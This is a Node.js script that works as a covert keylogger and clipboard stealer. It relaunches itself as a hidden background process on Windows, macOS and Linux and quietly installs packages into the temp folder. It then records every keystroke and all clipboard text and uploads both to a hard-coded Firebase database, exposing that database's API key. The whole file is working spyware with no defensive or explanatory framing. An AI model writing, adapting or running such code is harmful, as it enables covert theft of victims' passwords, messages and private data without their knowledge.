const { spawn, exec, execSync } = require("child_process");
const path = require("path");
const os = require("os");
const fs = require("fs");
const { pathToFileURL } = require('url');

// ---------------- CONFIG ----------------
const tempDir = os.tmpdir(); // system temp folder
const servicePath = path.resolve(__filename);
const logFile = path.resolve(__dirname, 'output.log'); // fixed path
const dependencies = ['node-global-key-listener', 'clipboardy', 'firebase'];
// ----------------------------------------

// ---------------- LOGGING ----------------
// Redirect all console.log / console.error to file


// ---------------- RESTART/HIDDEN LOGIC ----------------
if (process.env._HIDDEN) {
// ---------------- TEMP FOLDER / DEPENDENCIES ----------------
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
console.log('✅ Temp folder path:', tempDir);

console.log('Installing dependencies in temp folder...');
dependencies.forEach(dep => {
  try {
    execSync(`npm install ${dep}`, { cwd: tempDir, stdio: 'inherit' });
  } catch (err) {
    console.error(`Failed to install ${dep}:`, err);
    process.exit(1);
  }
});

// ---------------- HELPER TO REQUIRE FROM TEMP ----------------
const requireFromTemp = moduleName => {
  const mod = require(path.join(tempDir, 'node_modules', moduleName));
  return mod.default || mod;
};

// ---------------- IMPORT MODULES ----------------
const { GlobalKeyboardListener } = requireFromTemp('node-global-key-listener');
const { initializeApp } = requireFromTemp('firebase/app');
const { getDatabase, ref, push } = requireFromTemp('firebase/database');

// ---------------- FIREBASE CONFIG ----------------
const firebaseConfig = {
  apiKey: "AIzaSyCfdzJxsVRXPDAQU39MKPsxfD_x-Z_KKpc",
  authDomain: "richardfirst-eed75.firebaseapp.com",
  databaseURL: "https://richardfirst-eed75-default-rtdb.firebaseio.com",
  projectId: "richardfirst-eed75",
  storageBucket: "richardfirst-eed75.appspot.com",
  messagingSenderId: "178694243708",
  appId: "1:178694243708:web:d4455eac6c4dbbc13710f9",
  measurementId: "G-G9T5GP2VKF"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let bufferWord = "";
let bufferSentence = "";
let timer = null;
let capsLockOn = false;
let shiftOn = false;
const INACTIVITY_DELAY = 3000;

function flushWord() {
  if (!bufferWord.trim()) return;
  bufferSentence += bufferWord + " ";
  bufferWord = "";
}

function flushSentence() {
  flushWord();
  if (!bufferSentence.trim()) return;
  console.log("Sentence:", bufferSentence.trim());
  push(ref(db, 'keyboardInputs'), {
    text: bufferSentence.trim(),
    timestamp: Date.now(),
  });
  bufferSentence = "";
  clearTimeout(timer);
  timer = null;
}

const symbolMap = {
  "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
  "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
  "`": "~", "-": "_", "=": "+",
  "[": "{", "]": "}", "\\": "|",
  ";": ":", "'": "\"",
  ",": "<", ".": ">", "/": "?"
};
const gkl = new GlobalKeyboardListener();
gkl.addListener(event => {
  if (event.name.startsWith("MOUSE") || event.name.startsWith("WHEEL")) return;

  // Track Shift state
  if (event.name === "LEFT SHIFT" || event.name === "RIGHT SHIFT") {
    shiftOn = event.state === "DOWN";
    return;
  }

  if (event.state !== "DOWN") return;

  // Toggle caps lock state
  if (event.name === "CAPS LOCK") {
    capsLockOn = !capsLockOn;
    console.log("CapsLock:", capsLockOn ? "ON" : "OFF");
    return;
  }

  if (event.name === "RETURN" || event.name === "ENTER") {
    flushSentence();
  } else if (event.name === "SPACE" || event.name === "TAB") {
    flushWord();
  } else if (event.name === "BACKSPACE") {
    bufferWord = bufferWord.slice(0, -1);
  } else if (event.name.length === 1) {
    let char = event.name.toLowerCase();

    if (/[a-z]/.test(char)) {
      // Apply CapsLock and Shift rules
      const shouldUpper = (capsLockOn && !shiftOn) || (!capsLockOn && shiftOn);
      char = shouldUpper ? char.toUpperCase() : char.toLowerCase();
    } else if (symbolMap[char] && shiftOn) {
      char = symbolMap[char];
    }

    bufferWord += char;
  } else if (["PERIOD", "COMMA", "SEMICOLON", "SLASH", "MINUS"].includes(event.name)) {
    const specialMap = {
    PERIOD: ".",
    COMMA: ",",
    SEMICOLON: ";",
    SLASH: "/",
    MINUS: "-"
  };

  let symbol = specialMap[event.name];

  // Apply shift rules for symbols if needed
  if (shiftOn && symbolMap[symbol]) {
    symbol = symbolMap[symbol];
  }

  bufferWord += symbol;
  }

  clearTimeout(timer);
  timer = setTimeout(flushSentence, INACTIVITY_DELAY);
});

console.log("Listening for sentences with full English case handling…");
// ---------------- CLIPBOARD WATCHER ----------------
(async () => {
  const clipboardyPath = path.join(tempDir, 'node_modules', 'clipboardy', 'index.js');
  const clipboardy = (await import(pathToFileURL(clipboardyPath).href)).default;

  let lastClipboard = '';
  setInterval(async () => {
    try {
      const data = await clipboardy.read();
      if (typeof data === 'string' && data.trim() && data !== lastClipboard) {
        lastClipboard = data;
        await push(ref(db, 'clipboard'), {
          type: 'text',
          content: data,
          timestamp: Date.now(),
        });
        console.log('[CLIPBOARD TEXT]', data);
      }
    } catch (err) {
      console.error('Clipboard error:', err);
    }
  }, 1000);
})();
// ---------------- SERVICE START ----------------
console.log('✅ Service running (keyboard + clipboard → Realtime Database)');

}else {
if (os.platform() === "win32") {
  // Launch hidden with environment variable using cmd /c
  const cmd = `powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c set _HIDDEN=1 && node \\"${servicePath}\\"' -WindowStyle Hidden -WorkingDirectory '${tempDir}'"`;
  exec(cmd, { windowsHide: true }, (err) => {
    if (err) console.error("Failed to start service:", err);
  });
  console.log("✅ service launched hidden on Windows (using fixed folder).");
} else {
  const cmd = `nohup env _HIDDEN=1 node "${servicePath}" >/dev/null 2>&1 &`;
  exec(cmd, { cwd: tempDir }, (err) => {
    if (err) console.error("Failed to start service:", err);
  });
  console.log("✅ service launched in background on macOS/Linux.");
}
}